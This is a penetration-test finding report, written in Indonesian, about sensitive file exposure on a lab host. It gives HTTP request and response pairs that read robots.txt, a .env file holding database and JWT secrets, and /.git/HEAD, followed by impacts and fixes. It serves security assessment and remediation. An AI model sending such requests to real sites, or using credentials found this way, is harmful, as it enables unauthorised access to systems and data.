# Finding 06: Sensitive Data Exposure / Information Disclosure

| Item | Detail |
|------|--------|
| **Kerentanan** | Sensitive Data Exposure / Information Disclosure |
| **Severity** | High |
| **Skor CVSS** | 7.5 (`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N`) |
| **URL PoC** | `http://teknobantu.lab/.env` |
| **Endpoint / Path** | `GET /.env`, `GET /robots.txt`, `GET /.git/`, `GET /backup.sql` |

---

## Deskripsi

Kerentanan **Sensitive Data Exposure / Information Disclosure** terjadi ketika aplikasi web atau server mengekspos berkas rahasia, direktori tersembunyi, atau informasi konfigurasi sensitif secara terbuka tanpa adanya autentikasi dan otorisasi. Berkas seperti `.env`, `robots.txt` yang mengungkapkan direktori rahasia, repositori `.git`, serta berkas cadangan (*backup*) atau konfigurasi server dapat diakses secara publik langsung melalui browser atau alat otomatis (*directory bruteforce*).

---

## Dampak

- Kebocoran Kredensial dan Data Sensitif Akses terbuka pada file .env menyebabkan bocornya informasi penting seperti password database (DB_PASSWORD), kunci JWT (JWT_SECRET), dan API key pihak ketiga tanpa perlu login.
- bocoran Kode Sumber (Source Code Exposure) Direktori .git/ yang bisa diakses publik memudahkan pihak luar untuk mengunduh dan menyusun ulang seluruh kode sumber aplikasi untuk mencari celah keamanan.
- Pemetaan Struktur Internal via robots.txt Petunjuk Disallow: pada file robots.txt memberikan informasi secara langsung mengenai lokasi folder tersembunyi dan halaman admin kepada penyerang.
- Pengambilalihan Sistem Secara Penuh (Full System Compromise) Kredensial database atau SSH key yang bocor dari file konfigurasi dapat digunakan penyerang untuk masuk dan menguasai seluruh server target.
- Kebocoran File Backup (Backup Data Exposure) File cadangan (backup) yang tertinggal di direktori publik memudahkan pihak luar mengunduh arsip data sensitif, informasi pengguna, dan kode sumber sistem tanpa izin.

---

## Rekomendasi Perbaikan

- Blokir Akses ke File Sensitif Konfigurasikan server web (Nginx/Apache) untuk memblokir akses ke file/folder (.env, .git) serta file backup (.sql, .bak).
- Pindahkan File Konfigurasi dari Web Root Simpan file sensitif seperti .env di luar direktori publik server (misalnya ditaruh di folder induk) agar tidak bisa diakses langsung via browser.
- Hapus Direktori Rahasia dari robots.txt Bersihkan jalur halaman sensitif dari file robots.txt dan gunakan kontrol akses di sisi server (server-side authorization) untuk melindungi halaman internal.
- Lakukan Rotasi Kredensial Segera ganti password database, API key, dan secret token yang pernah terpapar pada file .env atau .git.


## Langkah Proof of Concept (PoC)

### Langkah 1 — Mengakses berkas `robots.txt` yang membocorkan lokasi direktori sensitif

Melakukan permintaan HTTP GET ke endpoint `/robots.txt` dan mengidentifikasi daftar lokasi folder internal/admin yang disembunyikan.

**Request:**

```http
GET /robots.txt HTTP/1.1
Host: teknobantu.lab
User-Agent: Mozilla/5.0
```

**Response:**

```http
HTTP/1.1 200 OK
Content-Type: text/plain

User-agent: *
Disallow: /admin-secret/
Disallow: /backup/
Disallow: /.env
```

> **Capture 1:** Response berkas `robots.txt` yang mengungkapkan direktori tersembunyi

---

### Langkah 2 — Mengunduh berkas `.env` dan mengekstraksi kredensial rahasia

Berdasarkan petunjuk dari `robots.txt` atau hasil directory bruteforce, penyerang mengakses berkas `/.env` secara langsung melalui browser/curl.

**Request:**

```http
GET /.env HTTP/1.1
Host: teknobantu.lab
```

**Response:**

```http
HTTP/1.1 200 OK
Content-Type: text/plain

DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=klaimku
DB_USERNAME=klaimku_app
DB_PASSWORD=klaimku_app_pw
JWT_SECRET=supersecretkey123
```

> **Capture 2:** Response pembacaan berkas rahasia `.env` yang berisi kredensial database dan JWT secret

---

### Langkah 3 — Memeriksa ekspos repositori `.git` dan file backup `.sql`

Mengonfirmasi keterbukaan folder `.git` (`/.git/HEAD`) dan berkas dump database (`/backup/database.sql`).

**Request:**

```http
GET /.git/HEAD HTTP/1.1
Host: teknobantu.lab
```

**Response:**

```http
HTTP/1.1 200 OK
Content-Type: text/plain

ref: refs/heads/main
```

> **Capture 3:** Akses terbuka ke repositori `.git` dan struktur source code target
